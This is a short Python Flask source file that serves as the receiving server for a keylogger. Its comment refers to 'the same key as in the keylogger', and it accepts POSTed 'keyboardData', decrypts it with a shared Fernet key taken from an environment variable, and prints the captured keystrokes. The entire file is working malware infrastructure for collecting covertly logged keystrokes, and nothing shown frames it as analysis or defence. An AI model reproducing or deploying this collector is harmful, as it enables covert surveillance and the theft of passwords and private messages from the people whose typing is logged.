from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import os

app = Flask(__name__)

# Use the same key as in the keylogger
ENCRYPTION_KEY = os.getenv("KEYLOGGER_KEY") # Store as string
cipher = Fernet(ENCRYPTION_KEY.encode())  # Encode properly


@app.route("/", methods=["POST"])
def receive_data():
    data = request.json

    try:
        encrypted_text = data["keyboardData"].encode()  # Convert back to bytes
        decrypted_text = cipher.decrypt(encrypted_text).decode("utf-8", errors="ignore")  # Decode properly

        print(f"Received keystrokes: {decrypted_text}")
    except Exception as e:
        print("Error decrypting:", str(e))
        return jsonify({"status": "error", "message": str(e)}), 400

    return jsonify({"status": "success"}), 200


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080, debug=True)
